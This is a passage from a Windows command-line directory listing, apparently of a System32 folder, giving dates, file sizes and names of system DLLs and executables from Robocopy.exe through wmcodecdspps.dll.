21/11/2010  03:23           128,000 Robocopy.exe
14/07/2009  01:39            21,504 ROUTE.EXE
14/07/2009  01:41             7,680 RpcDiag.dll
14/07/2009  01:41            67,072 RpcEpMap.dll
02/09/2016  15:30           190,464 rpchttp.dll
14/07/2009  01:41            52,736 RPCNDFP.dll
14/07/2009  01:41             9,216 RpcNs4.dll
14/07/2009  01:41            31,744 rpcnsh.dll
14/07/2009  01:39            30,208 RpcPing.exe
02/09/2016  15:30         1,212,928 rpcrt4.dll
21/11/2010  03:24            65,536 RpcRtRemote.dll
21/11/2010  03:24           512,000 rpcss.dll
08/12/2015  19:07            55,808 rrinstaller.exe
14/07/2009  01:43           281,256 rsaenh.dll
14/07/2009  01:41            53,760 rshx32.dll
10/06/2009  20:47            43,566 rsop.msc
14/07/2009  01:41           188,416 RstrtMgr.dll
02/09/2016  14:57           296,960 rstrui.exe
14/07/2009  01:41            41,984 rtffilt.dll
14/07/2009  01:41           138,240 rtm.dll
21/11/2010  03:23            52,224 rtutils.dll
15/07/2017  07:54    <DIR>          ru-RU
14/07/2009  01:39            20,480 runas.exe
14/07/2009  01:39            45,568 rundll32.exe
14/07/2009  01:39            58,880 RunLegacyCPLElevated.exe
21/11/2010  03:24            56,832 runonce.exe
21/11/2010  03:24            21,504 rwinsta.exe
21/11/2010  03:24            67,584 samcli.dll
14/07/2009  01:41           107,008 samlib.dll
14/07/2009  01:32             2,048 SampleRes.dll
21/11/2010  03:24           758,784 samsrv.dll
14/07/2009  01:41            12,800 sas.dll
23/12/2010  10:42         1,118,720 sbe.dll
14/07/2009  01:41           212,480 sbeio.dll
14/07/2009  01:32            65,536 sberes.dll
14/07/2009  01:39            13,824 sbunattend.exe
14/07/2009  01:39            45,056 sc.exe
21/11/2010  03:24           303,616 scansetting.dll
14/07/2009  01:41            82,432 SCardDlg.dll
14/07/2009  01:41           190,976 SCardSvr.dll
21/11/2010  03:24            10,429 ScavengeSpace.xml
28/08/2013  01:12           461,312 scavengeui.dll
14/07/2009  01:41            65,536 sccls.dll
21/11/2010  03:24           232,960 scecli.dll
08/12/2014  03:09           406,528 scesrv.dll
14/07/2009  01:41            89,088 scext.dll
02/09/2016  15:30           345,600 schannel.dll
21/11/2010  03:24            24,064 schedcli.dll
05/08/2015  17:56         1,110,016 schedsvc.dll
21/11/2010  03:24           285,696 schtasks.exe
14/07/2009  01:41           225,792 scksp.dll
14/07/2009  01:41            77,312 scripto.dll
14/07/2009  01:38            11,264 scrnsave.scr
14/07/2009  01:41           230,400 scrobj.dll
21/11/2010  03:24           568,832 scrptadm.dll
12/10/2013  02:31           202,752 scrrun.dll
14/07/2009  01:41            48,640 sdautoplay.dll
29/10/2015  17:50            23,552 sdbinst.exe
14/07/2009  01:39            51,712 sdchange.exe
21/11/2010  03:25         1,264,640 sdclt.exe
21/11/2010  03:25           762,368 sdcpl.dll
15/01/2021  10:46           358,784 sdelete.exe
15/01/2021  12:01           459,136 sdelete64.exe
21/11/2010  03:25         1,120,768 sdengin2.dll
14/07/2009  01:41            34,304 sdhcinst.dll
14/07/2009  01:41           210,944 sdiageng.dll
14/07/2009  01:39            23,552 sdiagnhost.exe
14/07/2009  01:41           230,400 sdiagprv.dll
14/07/2009  01:41            51,200 sdiagschd.dll
14/07/2009  01:41           543,232 sdohlp.dll
21/11/2010  03:25           170,496 sdrsvc.dll
14/07/2009  01:41           126,464 sdshext.dll
04/05/2011  05:19           113,664 SearchFilterHost.exe
21/11/2010  03:24           867,840 SearchFolder.dll
04/05/2011  05:19           591,872 SearchIndexer.exe
04/05/2011  05:19           249,856 SearchProtocolHost.exe
14/07/2009  01:39            36,864 SecEdit.exe
25/05/2015  18:19           113,664 sechost.dll
14/07/2009  01:39            16,896 secinit.exe
09/02/2016  09:55            30,720 seclogon.dll
10/06/2009  20:55           120,458 secpol.msc
04/12/2013  02:27           488,448 secproc.dll
04/12/2013  02:27           485,888 secproc_isv.dll
04/12/2013  02:27           123,392 secproc_ssp.dll
04/12/2013  02:27           123,392 secproc_ssp_isv.dll
02/09/2016  15:30            28,160 secur32.dll
14/07/2009  01:32             5,120 security.dll
14/07/2009  01:41            69,632 sendmail.dll
14/07/2009  01:41            64,512 Sens.dll
14/07/2009  01:41            15,872 SensApi.dll
14/07/2009  01:41           174,592 SensorsApi.dll
14/07/2009  01:41            93,184 SensorsClassExtension.dll
21/11/2010  03:25         2,250,752 SensorsCpl.dll
14/07/2009  01:41            29,184 sensrsvc.dll
14/07/2009  01:41            17,920 serialui.dll
13/04/2015  03:28           328,704 services.exe
10/06/2009  20:38            92,745 services.msc
14/07/2009  01:41            22,528 serwvdrv.dll
21/11/2010  03:24           121,856 SessEnv.dll
02/09/2016  15:30            63,488 setbcdlocale.dll
21/11/2010  03:24           279,040 sethc.exe
14/07/2017  18:04            90,112 SetIEInstalledDate.exe
14/07/2009  01:39            34,816 setspn.exe
12/04/2011  07:45    <DIR>          Setup
21/11/2010  03:24         1,900,544 setupapi.dll
21/11/2010  03:23            88,576 setupcl.exe
14/07/2009  01:41           115,712 setupcln.dll
14/07/2009  01:33             5,120 setupetw.dll
14/07/2009  01:39           118,272 setupugc.exe
14/07/2009  01:39            57,856 setx.exe
14/07/2009  01:33             3,072 sfc.dll
14/07/2009  01:39            39,424 sfc.exe
14/07/2009  01:41            45,056 sfc_os.dll
21/11/2010  03:23           135,168 shacct.dll
21/11/2010  03:24            21,504 shadow.exe
21/11/2010  03:24           357,888 sharemediacpl.dll
26/07/2013  02:24           197,120 shdocvw.dll
29/08/2016  15:31        14,183,424 shell32.dll
14/07/2009  01:25           514,048 shellstyle.dll
14/07/2009  01:41            10,240 shfolder.dll
21/11/2010  03:23            28,160 shgina.dll
10/06/2009  20:48            16,740 ShiftJIS.uce
29/10/2015  17:50             6,656 shimeng.dll
21/11/2010  03:24            37,376 shimgvw.dll
21/11/2010  03:24           448,512 shlwapi.dll
14/07/2009  01:41            17,920 shpafact.dll
14/07/2009  01:39           407,552 shrpubw.exe
21/11/2010  03:23           130,048 shsetup.dll
21/11/2010  03:23           370,688 shsvcs.dll
21/11/2010  03:24            11,264 shunimpl.dll
14/07/2009  01:39            34,304 shutdown.exe
21/11/2010  03:23           451,072 shwebsvc.dll
14/07/2009  01:41            54,272 signdrv.dll
14/07/2009  01:39            74,752 sigverif.exe
14/07/2009  00:28            12,288 simpdata.tlb
21/11/2010  03:24            24,064 sisbkup.dll
14/07/2009  03:20    <DIR>          sk-SK
14/07/2009  03:20    <DIR>          sl-SI
14/07/2009  01:41            30,720 slc.dll
14/07/2009  01:41            18,432 slcext.dll
12/04/2011  07:45    <DIR>          slmgr
10/06/2009  20:59           113,629 slmgr.vbs
21/11/2010  03:24           349,696 slui.exe
21/11/2010  03:24            15,360 slwga.dll
04/10/2013  02:28           190,464 SmartcardCredentialProvider.dll
14/07/2009  01:41           116,224 SMBHelperClass.dll
14/07/2009  03:20    <DIR>          SMI
21/11/2010  03:23           933,376 SmiEngine.dll
02/09/2016  14:53           112,640 smss.exe
21/11/2010  03:23           273,920 SndVol.exe
21/11/2010  03:23           225,280 SndVolSSO.dll
14/07/2009  01:39           431,104 SnippingTool.exe
14/07/2009  01:41            27,648 snmpapi.dll
14/07/2009  01:39            14,336 snmptrap.exe
14/07/2009  01:41           229,376 SNTSearch.dll
14/07/2009  01:41           159,232 softkbd.dll
14/07/2009  01:41             9,216 softpub.dll
14/07/2009  01:39            22,528 sort.exe
14/07/2009  01:41            51,200 SortServer2003Compat.dll
14/07/2009  01:41            78,848 SortWindows6Compat.dll
14/07/2009  01:39           142,336 SoundRecorder.exe
21/11/2010  03:24            78,848 spbcd.dll
10/06/2009  21:08             8,280 spcinstrumentation.man
14/07/2009  01:41            13,312 spcmsg.dll
14/07/2009  05:32    <DIR>          Speech
14/07/2009  01:41           238,592 sperror.dll
14/07/2009  01:41            97,792 spfileq.dll
14/07/2009  01:41           105,472 SPInf.dll
21/11/2010  03:24           598,016 spinstall.exe
14/07/2009  01:41            10,240 spnet.dll
14/07/2009  04:53    <DIR>          spool
14/07/2009  01:41            57,856 spoolss.dll
21/11/2010  03:24           559,104 spoolsv.exe
21/11/2010  03:24            18,944 spopk.dll
14/07/2009  03:20    <DIR>          spp
21/11/2010  03:25           244,224 spp.dll
21/11/2010  03:24           145,920 sppc.dll
14/07/2009  01:41           413,696 sppcc.dll
14/07/2009  01:41         1,203,712 sppcext.dll
21/11/2010  03:24           232,448 sppcomapi.dll
14/07/2009  01:41           381,952 sppcommdlg.dll
14/07/2009  01:41           113,152 sppinst.dll
21/11/2010  03:24           102,400 sppnp.dll
21/11/2010  03:24         1,082,880 sppobjs.dll
21/11/2010  03:23         3,524,608 sppsvc.exe
21/11/2010  03:30    <DIR>          sppui
14/07/2009  01:41            65,536 sppuinotify.dll
21/11/2010  03:23           418,816 sppwinob.dll
14/07/2009  01:41           142,336 sppwmi.dll
21/11/2010  03:24           301,568 spreview.exe
14/07/2009  01:41            13,824 spwinsat.dll
21/11/2010  03:24           445,952 spwizeng.dll
14/07/2009  01:33         8,338,432 spwizimg.dll
21/11/2010  03:24             7,680 spwizres.dll
21/11/2010  03:24           263,168 spwizui.dll
21/11/2010  03:24             9,728 spwmp.dll
14/07/2009  01:41           195,072 sqlceoledb30.dll
14/07/2009  01:41           843,776 sqlceqp30.dll
21/11/2010  03:24           446,976 sqlcese30.dll
21/11/2010  03:23           933,888 sqlsrv32.dll
14/07/2009  00:28           106,496 sqlsrv32.rll
21/11/2010  03:23           244,736 sqmapi.dll
14/07/2009  03:20    <DIR>          sr-Latn-CS
21/11/2010  03:25           340,992 srchadmin.dll
02/09/2016  15:31            50,176 srclient.dll
02/09/2016  15:31           503,808 srcore.dll
14/07/2009  01:39            18,944 srdelayed.exe
14/07/2009  01:41            86,528 srhelper.dll
14/07/2009  01:41           312,320 SrpUxNativeSnapIn.dll
21/11/2010  03:25           270,848 srrstr.dll
21/11/2010  03:24           128,000 srvcli.dll
21/11/2010  03:23           236,032 srvsvc.dll
14/07/2009  01:41            26,624 srwmi.dll
21/11/2010  03:23            13,312 sscore.dll
14/07/2009  01:41            51,200 ssdpapi.dll
14/07/2009  01:41           193,024 ssdpsrv.dll
02/09/2016  15:31           135,680 sspicli.dll
02/09/2016  15:31            28,672 sspisrv.dll
14/07/2009  01:41           121,856 SSShim.dll
21/11/2010  03:24           333,824 ssText3d.scr
14/07/2009  01:41            75,264 sstpsvc.dll
14/07/2009  01:41            66,560 stclient.dll
13/07/2009  23:59            16,896 stdole2.tlb
10/06/2009  20:47             7,168 stdole32.tlb
14/07/2009  01:41           292,352 sti.dll
14/07/2009  01:39           427,520 StikyNot.exe
14/07/2009  01:41           149,504 sti_ci.dll
21/11/2010  03:24           257,024 stobject.dll
14/07/2009  01:41            75,776 StorageContextHandler.dll
14/07/2009  01:41            70,144 Storprop.dll
14/07/2009  01:41            17,920 StorSvc.dll
14/07/2009  01:45            24,144 streamci.dll
11/05/2016  17:02           483,840 StructuredQuery.dll
10/06/2009  20:48            93,702 SubRange.uce
14/07/2009  01:39            15,360 subst.exe
21/11/2010  03:24           769,536 sud.dll
15/07/2017  07:54    <DIR>          sv-SE
14/07/2009  01:39            27,136 svchost.exe
14/07/2009  01:41           524,288 swprv.dll
14/07/2009  01:41            75,776 sxproxy.dll
21/11/2010  03:24           582,656 sxs.dll
14/07/2009  01:41            42,496 sxshared.dll
14/07/2009  01:41            31,744 sxssrv.dll
14/07/2009  01:41            27,136 sxsstore.dll
14/07/2009  01:39            35,328 sxstrace.exe
21/11/2010  03:24         2,262,528 SyncCenter.dll
25/09/2012  22:46            95,744 synceng.dll
14/07/2009  01:39            43,520 SyncHost.exe
14/07/2009  01:41            12,800 SyncHostps.dll
14/07/2009  01:41           426,496 SyncInfrastructure.dll
14/07/2009  01:41            37,888 SyncInfrastructureps.dll
14/07/2009  01:41            73,728 Syncreg.dll
21/11/2010  03:24           200,192 syncui.dll
21/11/2010  03:24           207,360 sysclass.dll
21/11/2010  03:24           352,768 sysdm.cpl
14/07/2009  01:39            33,792 syskey.exe
15/07/2015  18:10         1,743,360 sysmain.dll
21/11/2010  03:24           474,112 sysmon.ocx
14/07/2009  01:41            23,040 sysntfy.dll
14/07/2017  13:40    <DIR>          sysprep
14/07/2009  01:41             9,216 sysprepMCE.dll
10/06/2009  21:01             3,214 sysprint.sep
10/06/2009  21:01             3,577 sysprtj.sep
21/11/2010  03:24            17,408 syssetup.dll
21/11/2010  03:24           419,840 systemcpl.dll
14/07/2009  01:39           110,592 systeminfo.exe
14/07/2009  01:39            82,432 SystemPropertiesAdvanced.exe
14/07/2009  01:39            82,432 SystemPropertiesComputerName.exe
14/07/2009  01:39            82,432 SystemPropertiesDataExecutionPrevention.exe
14/07/2009  01:39            82,432 SystemPropertiesHardware.exe
14/07/2009  01:39            82,432 SystemPropertiesPerformance.exe
14/07/2009  01:39            82,432 SystemPropertiesProtection.exe
14/07/2009  01:39            82,432 SystemPropertiesRemote.exe
21/11/2010  03:24           347,904 systemsf.ebd
14/07/2009  01:39             9,216 systray.exe
21/11/2010  03:23           148,992 t2embed.dll
14/07/2009  01:41           119,808 Tabbtn.dll
14/07/2009  01:41            66,560 TabbtnEx.dll
21/11/2010  03:24            78,848 tabcal.exe
21/11/2010  03:24           684,032 TabletPC.cpl
21/11/2010  03:25            92,672 TabSvc.dll
21/11/2010  03:23            63,488 takeown.exe
14/07/2009  01:41           985,088 tapi3.dll
14/07/2009  01:41           248,832 tapi32.dll
14/07/2009  01:41            35,328 tapilua.dll
14/07/2009  01:41           103,936 TapiMigPlugin.dll
14/07/2009  01:41            11,264 tapiperf.dll
21/11/2010  03:24           316,928 tapisrv.dll
14/07/2009  01:41            11,776 TapiSysprep.dll
14/07/2009  01:33           108,544 tapiui.dll
14/07/2009  01:39            13,312 TapiUnattend.exe
21/11/2010  03:24           243,712 taskbarcpl.dll
21/11/2010  03:24           473,600 taskcomp.dll
21/11/2010  03:24           464,384 taskeng.exe
23/11/2012  03:13            68,608 taskhost.exe
14/07/2009  01:39           112,640 taskkill.exe
14/07/2009  01:39           108,544 tasklist.exe
21/11/2010  03:24           257,024 taskmgr.exe
14/07/2009  05:09    <DIR>          Tasks
21/11/2010  03:24         1,197,056 taskschd.dll
10/06/2009  20:58           145,059 taskschd.msc
14/07/2009  01:41            55,296 TaskSchdPS.dll
05/02/2016  18:56            20,480 tbs.dll
14/07/2009  01:39            15,360 tcmsetup.exe
10/06/2009  21:01             1,041 tcpbidi.xml
21/11/2010  03:24           253,440 tcpipcfg.dll
14/07/2009  01:41            38,912 tcpmib.dll
14/07/2009  01:41           195,072 tcpmon.dll
10/06/2009  21:01            60,124 tcpmon.ini
14/07/2009  01:41            73,216 tcpmonui.dll
14/07/2009  01:39            10,240 TCPSVCS.EXE
14/07/2017  18:04            77,312 tdc.ocx
23/07/2015  00:02           879,104 tdh.dll
14/07/2009  01:38           108,032 telephon.cpl
21/11/2010  03:24           421,888 termmgr.dll
14/10/2014  02:13           683,520 termsrv.dll
14/07/2009  03:20    <DIR>          th-TH
14/07/2009  01:41           318,464 thawbrkr.dll
21/11/2010  03:23         2,193,920 themecpl.dll
14/07/2009  01:41            44,544 themeservice.dll
21/11/2010  03:23         2,851,840 themeui.dll
21/11/2010  03:23           112,640 thumbcache.dll
10/06/2009  20:31             1,988 ticrf.rat
30/12/2011  06:26           515,584 timedate.cpl
14/07/2009  01:41            10,240 TimeDateMUICallback.dll
14/07/2009  01:39            33,280 timeout.exe
14/07/2009  01:28           176,128 tintlgnt.ime
21/11/2010  03:24            73,728 tlscsp.dll
10/06/2009  21:04           144,862 tpm.msc
14/07/2009  01:41            42,496 tpmcompc.dll
14/07/2009  01:39           115,200 TpmInit.exe
04/05/2011  05:25         2,315,776 tquery.dll
15/07/2017  07:54    <DIR>          tr-TR
25/05/2015  18:18           404,992 tracerpt.exe
14/07/2009  01:39            13,824 TRACERT.EXE
14/07/2009  01:41            39,424 traffic.dll
21/11/2010  03:24            21,504 TRAPI.dll
13/07/2009  23:25            18,944 tree.com
14/07/2009  01:41           119,808 trkwks.dll
21/11/2010  03:24            14,848 tsbyuv.dll
21/11/2010  03:24           200,192 tscfgwmi.dll
14/07/2009  01:41            17,408 TSChannel.dll
21/11/2010  03:24            22,528 tscon.exe
14/07/2009  00:16            17,408 tsddd.dll
21/11/2010  03:24            22,016 tsdiscon.exe
10/07/2015  17:51            44,032 tsgqec.dll
21/11/2010  03:24            23,552 tskill.exe
21/11/2010  03:24           299,520 tsmf.dll
02/09/2016  15:31            86,528 TSpkg.dll
14/07/2009  01:39            46,592 TSTheme.exe
21/11/2010  03:24            40,960 TsUsbGDCoInstaller.dll
21/11/2010  03:24             8,192 TsUsbRedirectionGroupPolicyControl.exe
21/11/2010  03:24            12,288 TsUsbRedirectionGroupPolicyExtension.dll
11/12/2014  17:47            52,736 TSWbPrxy.exe
01/08/2014  11:53         1,031,168 TSWorkspace.dll
06/06/2014  06:12            35,480 TsWpfWrp.exe
14/07/2009  01:41            34,816 tvratings.dll
21/11/2010  03:24           172,544 twext.dll
14/07/2009  01:41           119,296 txflog.dll
14/07/2009  01:41            11,776 txfw32.dll
25/05/2015  18:18            47,104 typeperf.exe
21/11/2010  03:23             2,048 tzres.dll
21/11/2010  03:23            58,368 tzutil.exe
03/02/2015  03:31           215,552 ubpm.dll
14/07/2009  01:41            57,856 ucmhc.dll
14/07/2009  01:39            41,984 ucsvc.exe
14/07/2009  01:41            53,248 udhisapi.dll
14/07/2009  01:41           328,704 uDWM.dll
14/07/2009  01:41            87,040 uexfat.dll
14/07/2009  01:41           126,976 ufat.dll
14/07/2009  01:39            40,960 UI0Detect.exe
14/07/2017  17:51           221,184 UIAnimation.dll
14/07/2009  01:41           751,104 UIAutomationCore.dll
14/07/2009  01:41            42,496 uicom.dll
14/07/2009  01:41         3,047,424 UIHub.dll
21/11/2010  03:23         3,860,992 UIRibbon.dll
21/11/2010  03:23         1,164,800 UIRibbonRes.dll
14/07/2009  03:20    <DIR>          uk-UA
14/07/2009  01:41           146,944 ulib.dll
21/11/2010  03:23            59,904 umb.dll
14/07/2009  01:41            20,480 umdmxfrm.dll
24/05/2011  11:42           404,480 umpnpmgr.dll
14/07/2009  01:41           163,840 umpo.dll
21/11/2010  03:25           214,528 umrdp.dll
21/11/2010  03:58            18,432 umstartup.etl
21/11/2010  03:40            46,080 umstartup000.etl
14/07/2009  01:41           248,832 unattend.dll
21/11/2010  03:24           321,536 unimdm.tsp
21/11/2010  03:24            73,216 unimdmat.dll
14/07/2009  01:41            23,040 uniplat.dll
14/07/2009  01:39            40,448 unlodctr.exe
14/07/2009  01:39           323,584 unregmp2.exe
21/11/2010  03:23           403,968 untfs.dll
21/11/2010  03:24           264,192 upnp.dll
14/07/2009  01:39            25,600 upnpcont.exe
14/07/2009  01:41           353,792 upnphost.dll
14/07/2009  01:41            29,184 ureg.dll
14/07/2017  18:04           235,520 url.dll
14/07/2017  18:04         1,545,728 urlmon.dll
14/07/2009  01:41            27,648 usbceip.dll
14/07/2009  01:41            45,056 usbmon.dll
14/07/2009  01:41            13,312 usbperf.dll
14/07/2009  01:41           101,376 usbui.dll
21/11/2010  03:24         1,008,128 user32.dll
21/11/2010  03:24            84,480 UserAccountControlSettings.dll
14/07/2009  01:39           193,536 UserAccountControlSettings.exe
21/11/2010  03:24           625,664 usercpl.dll
21/11/2010  03:24           109,056 userenv.dll
21/11/2010  03:24            30,720 userinit.exe
07/12/2012  11:20            30,720 usk.rs
21/11/2010  03:24           800,256 usp10.dll
22/07/2015  16:48            41,984 UtcResources.dll
14/07/2009  01:41            34,816 utildll.dll
14/07/2009  01:39         1,402,880 Utilman.exe
14/07/2009  01:41           169,472 uudf.dll
14/07/2009  01:41            25,088 UXInit.dll
21/11/2010  03:24           154,624 uxlib.dll
14/07/2009  01:33             2,560 uxlibres.dll
14/07/2009  01:41            38,912 uxsms.dll
14/07/2009  01:41           332,288 uxtheme.dll
21/11/2010  03:24           691,200 VAN.dll
21/11/2010  03:24         1,098,240 Vault.dll
14/07/2009  01:41            41,984 vaultcli.dll
14/07/2009  01:39            27,136 VaultCmd.exe
14/07/2009  01:41            80,384 VaultCredProvider.dll
14/07/2009  01:41           374,272 vaultsvc.dll
14/07/2009  01:39            40,448 VaultSysUi.exe
21/11/2010  03:24           196,096 VBICodec.ax
21/11/2010  03:24            43,520 vbisurf.ax
14/07/2017  18:04           584,192 vbscript.dll
21/11/2010  03:23           533,504 vds.exe
21/11/2010  03:24           190,976 vdsbas.dll
14/07/2009  01:41           582,656 vdsdyn.dll
14/07/2009  01:39            22,528 vdsldr.exe
21/11/2010  03:23           185,856 vdsutil.dll
14/07/2009  01:41            55,296 vdsvd.dll
14/07/2009  01:41           116,736 vds_ps.dll
14/07/2009  01:39            11,776 verclsid.exe
14/07/2009  01:41           374,784 verifier.dll
14/07/2009  01:39           155,648 verifier.exe
14/07/2009  01:41            29,184 version.dll
21/11/2010  03:24            68,096 vfwwdm32.dll
13/07/2009  23:38            15,360 vga.dll
14/07/2009  01:38            28,672 vidcap.ax
08/12/2015  19:07           292,352 VIDRESZR.DLL
14/07/2009  01:41            21,504 virtdisk.dll
12/05/2017  16:16           113,112 vm3ddevapi64.dll
12/05/2017  16:16        19,044,824 vm3dgl64.dll
12/05/2017  16:16           362,456 vm3dum64.dll
12/05/2017  16:16           217,552 vm3dum64_10.dll
21/11/2010  03:23           130,048 VmbusCoinstaller.dll
21/11/2010  03:23            15,872 vmbuspipe.dll
21/11/2010  03:23            44,544 vmbusres.dll
21/11/2010  03:23           129,024 VmdCoinstall.dll
12/05/2017  16:13           393,192 vmGuestLib.dll
12/05/2017  16:13            48,616 vmGuestLibJava.dll
21/11/2010  03:23            53,760 vmicres.dll
21/11/2010  03:23           244,224 vmicsvc.exe
21/11/2010  03:23            51,712 vmictimeprovider.dll
21/11/2010  03:23            38,400 vmstorfltres.dll
12/05/2017  15:58            22,016 VMWSU_V1_0.DLL
21/11/2010  03:24           263,168 vpnike.dll
21/11/2010  03:23            38,912 vpnikeapi.dll
11/02/2017  00:10            69,104 vsocklib.dll
14/07/2009  01:39           167,424 vssadmin.exe
21/11/2010  03:24         1,753,088 vssapi.dll
14/07/2009  01:41            76,800 vsstrace.dll
21/11/2010  03:23         1,600,512 VSSVC.exe
21/11/2010  03:24            61,952 vss_ps.dll
14/07/2009  01:41           381,952 w32time.dll
14/07/2009  01:39            81,408 w32tm.exe
14/07/2009  01:41            35,328 w32topl.dll
14/07/2009  01:41            72,192 WABSyncProvider.dll
14/07/2009  01:39            44,544 waitfor.exe
21/11/2010  03:25            61,952 WavDest.dll
21/11/2010  03:24           255,488 wavemsp.dll
14/07/2009  01:39           265,728 wbadmin.exe
24/12/2017  02:23    <DIR>          wbem
21/11/2010  03:23           529,408 wbemcomn.dll
21/11/2010  03:25         1,504,256 wbengine.exe
14/07/2009  01:41           202,240 wbiosrvc.dll
12/04/2011  07:45    <DIR>          WCN
14/07/2009  01:41           120,832 WcnApi.dll
21/11/2010  03:24           367,104 wcncsvc.dll
14/07/2009  01:41            24,576 WcnEapAuthProxy.dll
14/07/2009  01:41            25,088 WcnEapPeerProxy.dll
14/07/2009  01:41            35,328 WcnNetsh.dll
14/07/2009  01:41         1,098,240 wcnwiz.dll
14/07/2009  01:41            40,960 WcsPlugInService.dll
21/11/2010  03:24         1,363,968 wdc.dll
28/11/2012  22:56             9,728 Wdfres.dll
14/07/2017  14:04    <DIR>          wdi
09/01/2015  03:14            91,136 wdi.dll
21/11/2010  03:24            36,352 wdiasqmmodule.dll
02/09/2016  15:31           210,432 wdigest.dll
21/11/2010  03:24           217,088 wdmaud.drv
14/07/2009  01:41           271,360 wdscore.dll
13/07/2009  21:54               614 WdsUnattendTemplate.xml
13/07/2009  23:55             4,096 WEB.rs
14/07/2017  18:04           243,200 webcheck.dll
21/11/2010  03:24           258,560 WebClnt.dll
09/03/2016  19:00           396,800 webio.dll
21/11/2010  03:24         1,158,656 webservices.dll
14/07/2009  01:41            88,576 wecapi.dll
14/07/2009  01:41           237,568 wecsvc.dll
14/07/2009  01:39           113,152 wecutil.exe
29/01/2014  02:32           484,864 wer.dll
21/11/2010  03:23         1,281,024 werconcpl.dll
14/07/2009  01:41            84,480 wercplsupport.dll
14/07/2009  01:41            34,304 werdiagcontroller.dll
14/07/2009  01:39           415,232 WerFault.exe
21/11/2010  03:24            26,112 WerFaultSecure.exe
14/07/2009  01:39            50,688 wermgr.exe
14/07/2009  01:41            76,800 wersvc.dll
14/07/2009  01:41           174,080 werui.dll
14/07/2009  01:41           428,032 wevtapi.dll
14/07/2009  01:41           116,736 wevtfwd.dll
21/11/2010  03:23         1,646,080 wevtsvc.dll
14/07/2009  01:39           273,920 wevtutil.exe
14/07/2017  18:04           143,872 wextract.exe
10/06/2009  20:46           115,091 WF.msc
14/07/2009  01:41            22,528 wfapigp.dll
14/07/2009  01:41            85,504 WfHC.dll
14/07/2009  05:09    <DIR>          wfp
21/11/2010  03:25           974,336 WFS.exe
14/07/2009  01:33           669,184 WFSR.dll
14/07/2009  01:41            35,328 whealogr.dll
14/07/2009  01:39            43,008 where.exe
14/07/2009  01:41            18,944 whhelper.dll
14/07/2009  01:39            52,736 whoami.exe
14/07/2009  01:39            96,256 wiaacmgr.exe
14/07/2009  01:41           669,696 wiaaut.dll
21/11/2010  03:24           462,336 wiadefui.dll
14/07/2009  01:41           141,824 wiadss.dll
14/07/2009  01:41             9,728 WiaExtensionHost64.dll
14/07/2009  01:41            43,520 wiarpc.dll
14/07/2009  01:41            99,328 wiascanprofiles.dll
21/11/2010  03:24           580,096 wiaservc.dll
14/07/2009  01:41           464,384 wiashext.dll
14/07/2009  01:41            14,848 wiatrace.dll
21/11/2010  03:24           124,928 wiavideo.dll
14/07/2009  01:39            36,352 wiawow64.exe
14/07/2009  01:41           503,296 wimgapi.dll
14/07/2009  01:39           403,968 wimserv.exe
30/07/2015  16:56         3,208,192 win32k.sys
26/06/2016  00:27           756,736 win32spl.dll
14/07/2009  01:41            78,848 winbio.dll
14/07/2009  05:32    <DIR>          WinBioDatabase
14/07/2009  05:37    <DIR>          WinBioPlugIns
14/07/2009  01:41            16,384 winbrand.dll
04/03/2014  09:44            39,936 wincredprovider.dll
21/11/2010  03:25           294,912 WindowsAnytimeUpgradeResults.exe
09/04/2016  03:52         1,424,896 WindowsCodecs.dll
14/07/2017  17:51           245,248 WindowsCodecsExt.dll
14/07/2009  05:32    <DIR>          WindowsPowerShell
14/07/2009  01:41            99,328 winethc.dll
14/07/2009  03:20    <DIR>          winevt
14/07/2009  01:41            29,184 WinFax.dll
11/05/2016  17:02           444,928 winhttp.dll
14/07/2017  18:04         2,426,880 wininet.dll
14/07/2009  01:39           129,024 wininit.exe
12/05/2016  17:15           105,472 winipsec.dll
02/09/2016  15:35           706,280 winload.efi
14/09/2015  21:40           634,432 winload.exe
17/07/2014  02:07           455,168 winlogon.exe
14/07/2009  01:41           217,600 winmm.dll
14/07/2009  01:41            26,112 winnsi.dll
02/09/2016  15:40           631,176 winresume.efi
18/03/2015  23:39           546,656 winresume.exe
12/04/2011  07:45    <DIR>          winrm
10/06/2009  21:00                35 winrm.cmd
10/06/2009  21:00           201,034 winrm.vbs
14/07/2009  01:41            28,672 winrnr.dll
14/07/2009  01:39            51,200 winrs.exe
14/07/2009  01:41           363,520 winrscmd.dll
14/07/2009  01:39            24,064 winrshost.exe
14/07/2009  01:33             1,536 winrsmgr.dll
14/07/2009  01:41            13,312 winrssrv.dll
21/11/2010  03:24         3,957,760 WinSAT.exe
21/11/2010  03:24           501,248 WinSATAPI.dll
21/11/2010  03:24           217,600 WinSCard.dll
13/05/2016  22:07            91,136 WinSetupUI.dll
14/07/2009  01:40            13,312 winshfhc.dll
14/07/2009  01:41            88,576 winsockhc.dll
21/11/2010  03:23           442,368 winspool.drv
14/07/2009  01:41            24,064 WINSRPC.DLL
02/09/2016  15:31           215,552 winsrv.dll
17/07/2014  02:07           235,520 winsta.dll
14/07/2009  01:41           413,696 WinSync.dll
14/07/2009  01:41           223,232 WinSyncMetastore.dll
14/07/2009  01:41           150,528 WinSyncProviders.dll
06/06/2016  16:50           228,864 wintrust.dll
14/07/2009  01:41            20,480 winusb.dll
14/07/2009  01:39            80,384 winver.exe
21/11/2010  03:25           405,504 wisptis.exe
21/11/2010  03:24            71,680 wkscli.dll
21/11/2010  03:24           248,832 wksprt.exe
14/07/2009  01:41            12,800 wksprtPS.dll
21/11/2010  03:24           118,784 wkssvc.dll
14/07/2009  01:41           114,176 wlanapi.dll
14/07/2009  01:41           168,448 wlancfg.dll
14/07/2009  01:41           712,192 WLanConn.dll
14/07/2009  01:41           501,248 wlandlg.dll
14/07/2009  01:39            99,328 wlanext.exe
21/11/2010  03:23           475,136 wlangpui.dll
14/07/2009  01:41           213,504 WLanHC.dll
14/07/2009  01:41           119,296 wlanhlp.dll
14/07/2009  01:41            19,968 wlaninst.dll
14/07/2009  01:41           832,512 WlanMM.dll
21/11/2010  03:24           414,720 wlanmsm.dll
21/11/2010  03:24         1,441,280 wlanpref.dll
14/07/2009  01:41           448,000 wlansec.dll
14/07/2009  01:41           886,784 wlansvc.dll
21/11/2010  03:24           414,208 wlanui.dll
14/07/2009  01:41            10,752 wlanutil.dll
21/11/2010  03:24           312,832 Wldap32.dll
14/07/2009  01:41           108,544 wlgpclnt.dll
14/07/2009  01:39            44,544 wlrmdr.exe
14/07/2009  01:41            10,752 WlS0WndH.dll
08/12/2015  19:07         1,232,896 WMADMOD.DLL
08/12/2015  19:07         1,153,024 WMADMOE.DLL
14/07/2009  01:41           297,984 WMASF.DLL
14/07/2009  01:41            44,032 wmcodecdspps.dll
